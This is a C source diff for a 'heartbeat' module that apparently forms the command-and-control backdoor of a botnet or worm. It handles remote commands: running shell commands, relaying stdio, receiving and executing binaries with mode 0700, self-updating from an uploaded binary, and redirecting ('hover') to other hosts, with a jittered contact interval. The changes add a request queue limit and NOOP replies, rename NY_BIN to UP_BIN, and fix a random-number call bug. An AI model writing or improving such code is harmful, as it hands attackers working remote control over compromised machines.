@@ -20,6 +20,7 @@
 #include <mbedtls/base64.h>
 
 
+#define HTBT_MAIN_REQ_Q_SIZE	2
 // Hover Max Redirection count
 #define HTBT_HOVER_MAX_REDIR	5
 // CNCP interval: HTBT_CNCP_INT_MIN + jitter
@@ -53,8 +54,8 @@ static const struct timespec HTBT_DL_TICK_TIMEOUT = { 30, 0 }; // 30s
 
 typedef uint_fast8_t htbt_lmk_t;
 #define HTBT_LMK_NONE		0
-#define HTBT_LMK_HOVER		1
-#define HTBT_LMK_NYBIN		2
+// #define HTBT_LMK_HOVER		1
+#define HTBT_LMK_UPBIN		2
 
 typedef struct {
 	int fd[2];
@@ -192,7 +193,7 @@ static void htbt_lm_release (prne_htbt_t *ctx, const htbt_lmk_t v) {
 }
 
 static bool htbt_main_q_req_slip (prne_htbt_t *ctx, htbt_req_slip_t *in) {
-	bool alloc, ret = false;
+	bool alloc = false, ret = false;
 	htbt_req_slip_t *ny_slip = (htbt_req_slip_t*)prne_malloc(
 		sizeof(htbt_req_slip_t),
 		1);
@@ -203,12 +204,17 @@ static bool htbt_main_q_req_slip (prne_htbt_t *ctx, htbt_req_slip_t *in) {
 	htbt_init_req_slip(ny_slip);
 
 	prne_dbgtrap(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
-	alloc =
-		prne_llist_append(
-			&ctx->main.req_q,
-			(prne_llist_element_t)ny_slip) != NULL;
-	if (alloc) {
-		prne_dbgtrap(pth_cond_notify(&ctx->main.cond, FALSE));
+	if (ctx->main.req_q.size < HTBT_MAIN_REQ_Q_SIZE) {
+		alloc =
+			prne_llist_append(
+				&ctx->main.req_q,
+				(prne_llist_element_t)ny_slip) != NULL;
+		if (alloc) {
+			prne_dbgtrap(pth_cond_notify(&ctx->main.cond, FALSE));
+		}
+	}
+	else {
+		errno = EAGAIN;
 	}
 	pth_mutex_release(&ctx->main.lock);
 	if (alloc) {
@@ -247,20 +253,11 @@ static bool htbt_main_q_hover (
 	prne_llist_entry_t *trace)
 {
 	bool ret = false;
-	htbt_lmk_t lmk = HTBT_LMK_NONE;
 	htbt_req_slip_t slip;
 	htbt_hv_req_body_t *body;
 	prne_llist_entry_t *ny_trace = NULL;
 
 	htbt_init_req_slip(&slip);
-
-	if (htbt_lm_acquire(ctx, HTBT_LMK_HOVER)) {
-		lmk = HTBT_LMK_HOVER;
-	}
-	else {
-		errno = EBUSY;
-		goto END;
-	}
 
 	slip.free_f = (prne_htbt_free_ft)htbt_free_hv_req_body;
 	slip.op = PRNE_HTBT_OP_HOVER;
@@ -298,9 +295,6 @@ END:
 		prne_dbgtrap(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
 		prne_llist_erase(&ctx->main.hover_req, ny_trace);
 		pth_mutex_release(&ctx->main.lock);
-	}
-	if (!ret && lmk != HTBT_LMK_NONE) {
-		htbt_lm_release(ctx, lmk);
 	}
 	htbt_free_req_slip(&slip);
 	return ret;
@@ -898,12 +892,15 @@ static void htbt_slv_fab_frame (
 	size_t req, actual;
 
 	prne_assert(ev != NULL);
+	prne_assert(!((body == NULL) ^ (ser_f == NULL)));
 
 	req = 0;
 	prne_htbt_ser_msg_head(NULL, 0, &actual, mh);
 	req += actual;
-	ser_f(NULL, 0, &actual, body);
-	req += actual;
+	if (ser_f != NULL) {
+		ser_f(NULL, 0, &actual, body);
+		req += actual;
+	}
 
 	prne_assert(req <= ctx->iobuf[1].size);
 	htbt_slv_consume_outbuf(ctx, req, ev);
@@ -929,12 +926,14 @@ static void htbt_slv_fab_frame (
 		&actual,
 		mh);
 	prne_iobuf_shift(ctx->iobuf + 1, actual);
-	ser_f(
-		ctx->iobuf[1].m + ctx->iobuf[1].len,
-		ctx->iobuf[1].avail,
-		&actual,
-		body);
-	prne_iobuf_shift(ctx->iobuf + 1, actual);
+	if (ser_f != NULL) {
+		ser_f(
+			ctx->iobuf[1].m + ctx->iobuf[1].len,
+			ctx->iobuf[1].avail,
+			&actual,
+			body);
+		prne_iobuf_shift(ctx->iobuf + 1, actual);
+	}
 }
 
 static void htbt_slv_fab_status (
@@ -974,6 +973,19 @@ static void htbt_slv_fab_status (
 	prne_htbt_free_msg_head(&mh);
 	prne_htbt_free_status(&s);
 	pth_event_free(my_ev, FALSE);
+}
+
+static void htbt_slv_fab_noop (
+	htbt_slv_ctx_t *ctx,
+	const bool is_rsp,
+	pth_event_t ev)
+{
+	prne_htbt_msg_head_t mh;
+
+	prne_htbt_init_msg_head(&mh);
+	mh.is_rsp = is_rsp;
+	htbt_slv_fab_frame(ctx, &mh, NULL, NULL, ev);
+	prne_htbt_free_msg_head(&mh);
 }
 
 static void htbt_slv_raise_protoerr (
@@ -1150,10 +1162,11 @@ static bool htbt_slv_srv_bin (
 	prne_htbt_status_code_t ret_status = PRNE_HTBT_STATUS_OK;
 	int32_t ret_errno = 0;
 	htbt_lmk_t lmk = HTBT_LMK_NONE;
+	mode_t tmpfm;
 
 	prne_dbgast(
 		mh->op == PRNE_HTBT_OP_RUN_BIN ||
-		mh->op == PRNE_HTBT_OP_NY_BIN);
+		mh->op == PRNE_HTBT_OP_UP_BIN);
 
 	prne_htbt_init_bin_meta(&bin_meta);
 
@@ -1177,15 +1190,15 @@ static bool htbt_slv_srv_bin (
 	}
 
 	if (ctx->cbset->tmpfile == NULL ||
-		(mh->op == PRNE_HTBT_OP_NY_BIN && ctx->cbset->ny_bin == NULL))
+		(mh->op == PRNE_HTBT_OP_UP_BIN && ctx->cbset->upbin == NULL))
 	{
 		ret_status = PRNE_HTBT_STATUS_UNIMPL;
 		goto SND_STATUS;
 	}
 
-	if (mh->op == PRNE_HTBT_OP_NY_BIN && ctx->lm_acquire_f != NULL) {
-		if (ctx->lm_acquire_f(ctx->ioctx, HTBT_LMK_NYBIN)) {
-			lmk = HTBT_LMK_NYBIN;
+	if (mh->op == PRNE_HTBT_OP_UP_BIN && ctx->lm_acquire_f != NULL) {
+		if (ctx->lm_acquire_f(ctx->ioctx, HTBT_LMK_UPBIN)) {
+			lmk = HTBT_LMK_UPBIN;
 		}
 		else {
 			ret_status = PRNE_HTBT_STATUS_ERRNO;
@@ -1195,10 +1208,12 @@ static bool htbt_slv_srv_bin (
 	}
 
 	errno = 0;
-	path = ctx->cbset->tmpfile(
-		ctx->cb_ctx,
-		bin_meta.bin_size,
-		mh->op == PRNE_HTBT_OP_RUN_BIN ? 0700 : 0600);
+	switch (mh->op) {
+	case PRNE_HTBT_OP_RUN_BIN:
+	case PRNE_HTBT_OP_UP_BIN: tmpfm = 0700; break;
+	default: tmpfm = 0600;
+	}
+	path = ctx->cbset->tmpfile(ctx->cb_ctx, bin_meta.bin_size, tmpfm);
 	if (path == NULL) {
 		ret_status = PRNE_HTBT_STATUS_ERRNO;
 		ret_errno = errno;
@@ -1303,7 +1318,7 @@ static bool htbt_slv_srv_bin (
 			&ret_errno);
 	}
 	else {
-		if (!ctx->cbset->ny_bin(ctx->cb_ctx, path, &bin_meta.cmd)) {
+		if (!ctx->cbset->upbin(ctx->cb_ctx, path, &bin_meta.cmd)) {
 			ret_status = PRNE_HTBT_STATUS_ERRNO;
 			ret_errno = errno;
 			goto SND_STATUS;
@@ -1455,6 +1470,7 @@ static bool htbt_slv_consume_inbuf (
 		switch (f_head.op) {
 		case PRNE_HTBT_OP_NOOP:
 			prne_iobuf_shift(ctx->iobuf + 0, -actual);
+			htbt_slv_fab_noop(ctx, true, root_ev);
 			break;
 		case PRNE_HTBT_OP_STDIO:
 			ret |= htbt_slv_srv_stdio(ctx, root_ev, actual, &f_head);
@@ -1467,7 +1483,7 @@ static bool htbt_slv_consume_inbuf (
 			ret |= htbt_slv_srv_run_cmd(ctx, root_ev, actual, &f_head);
 			break;
 		case PRNE_HTBT_OP_RUN_BIN:
-		case PRNE_HTBT_OP_NY_BIN:
+		case PRNE_HTBT_OP_UP_BIN:
 			ret |= htbt_slv_srv_bin(ctx, root_ev, actual, &f_head);
 			break;
 		case PRNE_HTBT_OP_HOVER:
@@ -1753,13 +1769,15 @@ static bool htbt_main_slv_setup_f (void *ioctx, pth_event_t ev) {
 	bool ret = true;
 	size_t actual;
 	prne_htbt_msg_head_t mh;
+	int f_ret;
 
 	prne_htbt_init_msg_head(&mh);
-	if (mbedtls_ctr_drbg_random(
+
+	f_ret = mbedtls_ctr_drbg_random(
 		ctx->parent->param.ctr_drbg,
 		(unsigned char *)&mh.id,
-		sizeof(mh.id) == 0))
-	{
+		sizeof(mh.id));
+	if (f_ret == 0) {
 		mh.id = (mh.id % PRNE_HTBT_MSG_ID_DELTA) + PRNE_HTBT_MSG_ID_MIN;
 	}
 	else {
@@ -2008,7 +2026,6 @@ static void *htbt_main_entry (void *p) {
 		switch (slip->op) {
 		case PRNE_HTBT_OP_HOVER:
 			htbt_main_srv_hover(ctx, (htbt_hv_req_body_t*)slip->body);
-			htbt_lm_release(ctx, HTBT_LMK_HOVER);
 			break;
 		default:
 			if (PRNE_DEBUG) {
